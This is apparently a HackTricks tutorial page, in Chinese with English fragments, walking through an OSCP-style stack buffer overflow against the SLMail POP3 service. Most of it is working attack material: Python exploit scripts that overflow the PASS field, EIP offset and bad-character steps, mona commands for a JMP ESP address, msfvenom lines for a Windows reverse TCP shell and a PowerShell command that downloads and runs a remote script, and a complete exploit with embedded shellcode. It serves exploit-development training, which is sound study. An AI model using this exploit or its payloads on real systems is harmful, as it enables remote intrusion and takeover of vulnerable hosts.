# Windows 利用 (基础指南 - OSCP lvl)

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> 寻找 post-OSCP kernel primitives？现代 registry hive corruption chains 用于确定性 SYSTEM shells 的方法在此有介绍：

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/windows-registry-hive-exploitation.md
{{#endref}}

## **开始安装 SLMail 服务**

## 重新启动 SLMail 服务

每次需要 **重启 SLMail 服务** 时，你可以使用 Windows 控制台：
```
net start slmail
```
![](<../images/image (988).png>)

## 非常基础的 python exploit 模板
```python
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '10.11.25.153'
port = 110

buffer = 'A' * 2700
try:
print "\nLaunching exploit..."
s.connect((ip, port))
data = s.recv(1024)
s.send('USER username' +'\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
print "\nFinished!."
except:
print "Could not connect to "+ip+":"+port
```
## **更改 Immunity Debugger 字体**

转到 `Options >> Appearance >> Fonts >> Change(Consolas, Blod, 9) >> OK`

## **将进程附加到 Immunity Debugger:**

**File --> Attach**

![](<../images/image (869).png>)

**然后按下 START 按钮**

## **发送 exploit 并检查 EIP 是否受影响:**

![](<../images/image (906).png>)

如本页开头所示，每次使服务崩溃后都应重新启动它。

## 创建一个 pattern 来修改 EIP

pattern 的大小应该等于你之前用来使服务崩溃的缓冲区大小。

![](<../images/image (420).png>)
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```
更改 exploit 的 buffer，设置 pattern，然后启动 exploit。

![](<../images/image (636).png>)

应该会出现一个新的 crash，但 EIP 地址不同：

![](<../images/image (418).png>)
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 39694438
```
看起来 **我们可以在 offset 2606 修改 EIP**。

验证它：修改 exploit 的 buffer：
```
buffer = 'A'*2606 + 'BBBB' + 'CCCC'
```
使用这个 buffer 时，EIP 崩溃后应指向 42424242 ("BBBB")

![](<../images/image (874).png>)

![](<../images/image (92).png>)

看起来它工作正常。

## 检查 stack 中的 Shellcode 空间

600B 应该足够任何强大的 shellcode。

让我们更改 bufer：
```
buffer = 'A'*2606 + 'BBBB' + 'C'*600
```
启动新的 exploit 并检查 EBP 以及有用 shellcode 的长度

![](<../images/image (119).png>)

![](<../images/image (879).png>)

你可以看到，当漏洞被触发时，EBP 指向 shellcode，并且我们在这里有大量空间放置 shellcode。

在这种情况下我们有 **from 0x0209A128 to 0x0209A2D6 = 430B.** 足够。

## 检查 bad chars

再次更改 buffer:
```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
buffer = 'A'*2606 + 'BBBB' + badchars
```
The badchars starts in 0x01 because 0x00 is almost always bad.

使用这个新的 buffer 反复执行 exploit，删除被发现无用的 chars：

For example:

In this case you can see that **you shouldn't use the char 0x0A** (nothing is saved in memory since the char 0x09).

![](<../images/image (111).png>)

In this case you can see that **the char 0x0D is avoided**:

![](<../images/image (1098).png>)

## 查找一个 JMP ESP 作为返回地址

Using:
```
!mona modules    #Get protections, look for all false except last one (Dll of SO)
```
你将**列出内存映射**。

搜索某个 DLL，满足以下条件：

- **Rebase: False**
- **SafeSEH: False**
- **ASLR: False**
- **NXCompat: False**
- **OS Dll: True**

![](<../images/image (555).png>)

现在，在该内存中你应该找到一些 JMP ESP 字节，为此执行：
```
!mona find -s "\xff\xe4" -m name_unsecure.dll # Search for opcodes insie dll space (JMP ESP)
!mona find -s "\xff\xe4" -m slmfc.dll # Example in this case
```
**然后，如果找到某个地址，选择一个不包含任何 badchar 的：**

![](<../images/image (605).png>)

**在这种情况下，例如： \_0x5f4a358f**\_

## 创建 shellcode
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f c -b '\x00\x0a\x0d'
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://10.11.0.41/nishang.ps1')\"" -f python -b '\x00\x0a\x0d'
```
If the exploit is not working but it should (you can see with ImDebg that the shellcode is reached), try to create other shellcodes (msfvenom with create different shellcodes for the same parameters).

**在 shellcode 开头添加一些 NOPS**，并使用它和 return address 来 JMP ESP，完成 exploit：
```bash
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '10.11.25.153'
port = 110

shellcode = (
"\xb8\x30\x3f\x27\x0c\xdb\xda\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x45\x12\x83\xed\xfc\x03\x75\x31\xc5\xf9\x89\xa5\x8b"
"\x02\x71\x36\xec\x8b\x94\x07\x2c\xef\xdd\x38\x9c\x7b\xb3\xb4"
"\x57\x29\x27\x4e\x15\xe6\x48\xe7\x90\xd0\x67\xf8\x89\x21\xe6"
"\x7a\xd0\x75\xc8\x43\x1b\x88\x09\x83\x46\x61\x5b\x5c\x0c\xd4"
"\x4b\xe9\x58\xe5\xe0\xa1\x4d\x6d\x15\x71\x6f\x5c\x88\x09\x36"
"\x7e\x2b\xdd\x42\x37\x33\x02\x6e\x81\xc8\xf0\x04\x10\x18\xc9"
"\xe5\xbf\x65\xe5\x17\xc1\xa2\xc2\xc7\xb4\xda\x30\x75\xcf\x19"
"\x4a\xa1\x5a\xb9\xec\x22\xfc\x65\x0c\xe6\x9b\xee\x02\x43\xef"
"\xa8\x06\x52\x3c\xc3\x33\xdf\xc3\x03\xb2\x9b\xe7\x87\x9e\x78"
"\x89\x9e\x7a\x2e\xb6\xc0\x24\x8f\x12\x8b\xc9\xc4\x2e\xd6\x85"
"\x29\x03\xe8\x55\x26\x14\x9b\x67\xe9\x8e\x33\xc4\x62\x09\xc4"
"\x2b\x59\xed\x5a\xd2\x62\x0e\x73\x11\x36\x5e\xeb\xb0\x37\x35"
"\xeb\x3d\xe2\x9a\xbb\x91\x5d\x5b\x6b\x52\x0e\x33\x61\x5d\x71"
"\x23\x8a\xb7\x1a\xce\x71\x50\x2f\x04\x79\x89\x47\x18\x79\xd8"
"\xcb\x95\x9f\xb0\xe3\xf3\x08\x2d\x9d\x59\xc2\xcc\x62\x74\xaf"
"\xcf\xe9\x7b\x50\x81\x19\xf1\x42\x76\xea\x4c\x38\xd1\xf5\x7a"
"\x54\xbd\x64\xe1\xa4\xc8\x94\xbe\xf3\x9d\x6b\xb7\x91\x33\xd5"
"\x61\x87\xc9\x83\x4a\x03\x16\x70\x54\x8a\xdb\xcc\x72\x9c\x25"
"\xcc\x3e\xc8\xf9\x9b\xe8\xa6\xbf\x75\x5b\x10\x16\x29\x35\xf4"
"\xef\x01\x86\x82\xef\x4f\x70\x6a\x41\x26\xc5\x95\x6e\xae\xc1"
"\xee\x92\x4e\x2d\x25\x17\x7e\x64\x67\x3e\x17\x21\xf2\x02\x7a"
"\xd2\x29\x40\x83\x51\xdb\x39\x70\x49\xae\x3c\x3c\xcd\x43\x4d"
"\x2d\xb8\x63\xe2\x4e\xe9"
)

buffer = 'A' * 2606 + '\x8f\x35\x4a\x5f' + "\x90" * 8 + shellcode
try:
print "\nLaunching exploit..."
s.connect((ip, port))
data = s.recv(1024)
s.send('USER username' +'\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
print "\nFinished!."
except:
print "Could not connect to "+ip+":"+port
```
> [!WARNING]
> 有些 shellcodes 会**自行覆盖**，因此务必始终在 shellcode 之前添加一些 NOPs。
 
## 改进 shellcode

添加以下参数：
```bash
EXITFUNC=thread -e x86/shikata_ga_nai
```
{{#include ../banners/hacktricks-training.md}}
